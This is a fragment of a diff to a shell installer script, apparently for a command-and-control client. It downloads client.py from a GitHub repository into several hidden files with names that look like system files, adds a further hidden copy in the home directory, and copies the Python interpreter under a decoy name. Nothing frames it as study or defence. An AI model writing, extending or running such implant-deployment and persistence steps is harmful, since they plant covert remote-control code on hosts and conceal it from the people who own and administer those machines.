@@ -3,6 +3,7 @@ mkdir /var/lib/sshb/
 #Curl the client file into it
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /usr/local/bin/.client.py
+curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > ~/.client.py
 #copy python
 cp /usr/bin/python3 /usr/bin/python3.1
 #Curl the service file into it
